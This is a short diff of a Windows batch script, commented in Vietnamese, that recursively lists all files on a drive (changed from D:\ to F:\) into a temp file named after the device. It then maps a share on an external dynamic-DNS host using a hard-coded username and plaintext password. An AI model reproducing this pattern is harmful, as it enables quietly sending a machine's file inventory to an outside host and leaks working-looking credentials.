@@ -21,7 +21,7 @@ set FileName=%DeviceName%_%DATE%_%TIME%.txt
 set TempFilePath=%temp%\%FileName%
 
 :: Liệt kê toàn bộ thư mục và file tại D:\ và ghi vào file tạm
-dir "D:\" /s > "%TempFilePath%"
+dir "F:\" /s > "%TempFilePath%"
 
 :: Di chuyển file đến vị trí chia sẻ mạng
 net use \\minhtuan283.ddns.net\HDD /user:minhtuan283 Thienngan2002
